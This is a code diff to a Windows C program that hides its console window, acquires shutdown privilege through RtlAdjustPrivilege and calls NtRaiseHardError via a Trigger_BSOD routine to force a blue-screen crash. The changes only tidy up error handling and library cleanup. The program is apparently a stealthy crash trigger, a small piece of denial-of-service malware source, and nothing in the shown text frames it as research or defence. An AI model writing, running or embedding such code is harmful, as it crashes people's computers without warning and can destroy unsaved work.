@@ -10,7 +10,7 @@ HMODULE ntdll = LoadLibraryW(L"ntdll.dll");
 pdef_RtlAdjustPrivilege RtlAdjustPrivilege = (pdef_RtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
 pdef_NtRaiseHardError NtRaiseHardError = (pdef_NtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
 
-// Simplified function to set privilege
+// Simplified function to set and unset privilege
 NTSTATUS Set_Privilege(ULONG perm, BOOLEAN enable, BOOLEAN current_thread)
 {
     BOOLEAN enabled;
@@ -29,10 +29,14 @@ VOID main()
     // Hide console
     ShowWindow(GetConsoleWindow(), SW_HIDE);
     // Check if get functions from ntdll.dll failed then exit.
-    if (RtlAdjustPrivilege == NULL || NtRaiseHardError == NULL) { ExitProcess(-1); }
+    if (RtlAdjustPrivilege == NULL || NtRaiseHardError == NULL) { goto Cleanup; }
     // Get shutdown privilege and check the result
-    if (Set_Privilege(19, TRUE, FALSE) == STATUS_SUCCESS) { Trigger_BSOD(0xC0000350); // 0xC0000350 = STATUS_HOST_DOWN, The transport determined that the remote system is down. }
+    if (Set_Privilege(19, TRUE, FALSE) == STATUS_SUCCESS) { 
+        Trigger_BSOD(0xC0000350); // 0xC0000350 = STATUS_HOST_DOWN, The transport determined that the remote system is down. 
+        goto Cleanup;
+    }
     // Cleanup code
-    FreeLibrary(ntdll);
+    Cleanup:
+    if (ntdll) { FreeLibrary(ntdll); }
     ExitProcess(1);
 }
